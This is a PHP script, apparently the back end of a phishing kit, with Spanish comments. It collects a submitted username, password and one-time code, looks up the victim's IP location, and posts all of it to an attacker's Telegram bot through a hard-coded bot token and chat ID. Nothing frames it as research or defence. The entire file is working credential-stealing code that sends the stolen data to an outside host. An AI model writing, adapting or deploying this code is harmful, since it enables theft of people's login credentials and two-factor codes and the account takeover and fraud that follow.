<?php

date_default_timezone_set("America/Bogota");

// 📥 DATOS RECIBIDOS
$usuario = $_POST['usuario'] ?? '';
$clave   = $_POST['clave'] ?? '';
$codigo  = $_POST['codigo'] ?? '';

// 🌐 IP REAL
// 🌐 IP REAL (CORREGIDO PARA HEROKU)
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';

// limpiar múltiples IP
if(strpos($ip, ',') !== false){
    $ip = explode(',', $ip)[0];
}

$ip = trim($ip);

// 🌍 GEOLOCALIZACIÓN CORRECTA
// 🌍 GEOLOCALIZACIÓN CORRECTA
$pais = "Desconocido";
$ciudad = "Desconocido";

$geoData = @file_get_contents("http://ipwho.is/".$ip);

if($geoData){
    $geo = json_decode($geoData);

    if($geo && isset($geo->success) && $geo->success){
        $pais = $geo->country;
        $ciudad = $geo->city;
    }
}
// 🕒 HORA
$fecha = date("Y-m-d H:i:s");

// 🔐 TOKEN Y CHAT ID (TU BOT)
$token = "8687740380:AAGWDU18CPeXsMWhpzy1n6uZ-MkeTxWYYUo";
$chat_id = "8448767308";

// 🧾 MENSAJE
$mensaje = "💳 NUEVO ACCESO\n\n";

if($usuario){
    $mensaje .= "👤 Usuario: $usuario\n";
}

if($clave){
    $mensaje .= "🔑 Clave: $clave\n";
}

if($codigo){
    $mensaje .= "📲 Código: $codigo\n";
}

$mensaje .= "\n🌐 IP: $ip\n";
$mensaje .= "📍 País: $pais\n";
$mensaje .= "🏙 Ciudad: $ciudad\n";
$mensaje .= "🕒 Hora: $fecha";

// 🚀 ENVÍO A TELEGRAM
$url = "https://api.telegram.org/bot$token/sendMessage";

$data = [
    "chat_id" => $chat_id,
    "text" => $mensaje
];

// CURL
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
curl_close($ch);

// RESPUESTA
echo "OK";

?>
